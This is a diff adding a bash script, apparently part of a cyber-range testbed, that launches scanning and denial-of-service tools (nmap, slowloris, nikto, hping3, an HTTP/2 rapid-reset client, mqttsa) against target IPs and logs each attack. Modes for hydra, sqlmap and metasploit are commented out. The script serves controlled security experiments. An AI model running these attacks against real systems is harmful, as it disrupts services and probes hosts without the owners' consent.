@@ -1,0 +1,154 @@
+#!/bin/bash
+
+mode=$1
+target=$2
+iname=$3
+total_time=$4
+port=$5
+attack_args=${@:6}
+
+if [ -z "$mode" ]
+then
+    mode="nmap"
+fi
+
+registry_base=(-a "attack-$mode"
+               -o "/app/results/"
+               -n "Starting attack $mode on $target using $attack_args")
+
+registry_base_end=(-a "attack-stop-$mode"
+               -o "/app/results/"
+               -n "Stopping attack $mode on $target using $attack_args")
+
+
+target_list=$(mentored-get-ip --na-regex $target --iname $iname)
+
+# Check if target_list is empty
+if [ -z "$target_list" ]
+then
+    echo "No target found"
+    # Use the parameter $2 as target
+    target_list=($2)
+fi
+
+if [ "$mode" == "nmap" ]
+then
+    # For each target_list
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" -t $ip
+        # Execute the command nmap with the ip as argument
+        timeout $total_time nmap $attack_args $ip
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+elif [ "$mode" == "slowloris" ]
+then
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" --destination_ports $port -t $ip
+        timeout $total_time slowloris $attack_args -p $port $ip
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+elif [ "$mode" == "nikto" ]
+then
+
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" --destination_ports 80 -t $ip
+        timeout $total_time nikto -host $ip $attack_args
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+# elif [ "$mode" == "hydra" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         hydra $attack_args $ip
+#     done
+# elif [ "$mode" == "sqlmap" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         sqlmap $attack_args $ip
+#     done
+# elif [ "$mode" == "metasploit" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         msfconsole $attack_args $ip
+#     done
+# elif [ "$mode" == "armitage" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         armitage $attack_args $ip
+#     done
+# elif [ "$mode" == "xerxes" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         xerxes $attack_args $ip
+#     done
+elif [ "$mode" == "hping3" ]
+then
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" --destination_ports $port -t $ip
+        timeout $total_time hping3 $attack_args -p $port $ip
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+elif [ "$mode" == "rapidreset" ]
+then
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" --destination_ports $port -t $ip
+        # Capture the stdout of the command
+        timeout $total_time rapidresetclient $attack_args -url https://$ip:$port | tee /app/results/rapidreset_$ip.log
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+elif [ "$mode" == "mqttsa" ]
+then
+    for ip in $target_list
+    do
+        mentored-registry-action "${registry_base[@]}" --destination_ports $port -t $ip
+        pushd /usr/local/bin/mqttsa
+        # TODO save the attack output to a file, doing stdout redirects doesn't work here though
+        timeout $total_time python3 mqttsa.py $attack_args $ip -p $port
+        # TODO: save the report to the results folder, not currently workinf for some reason
+        # mv *.pdf /app/results/
+        popd
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+# elif [ "$mode" == "nemesis" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         nemesis $attack_args $ip
+#     done
+# elif [ "$mode" == "dnsmap" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         dnsmap $attack_args $ip
+#     done
+# elif [ "$mode" == "dnsenum" ]
+# then
+#     for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+#     do
+#         dnsenum $attack_args $ip
+#     done
+# elif [ "$mode" == "dnsrecon" ]
+# then
+#     for ip in $(mentored
+# then
+elif [ "$mode" == "ping" ]
+then
+
+    # For each line returned by the command mentored-get-ip
+    for ip in $(mentored-get-ip --na-regex $target --iname $iname)
+    do
+        mentored-registry-action "${registry_base[@]}" -t $ip
+        # Execute the command ping with the ip as argument
+        timeout $total_time ping $attack_args $ip
+        mentored-registry-action "${registry_base_end[@]}" -t $ip
+    done
+fi
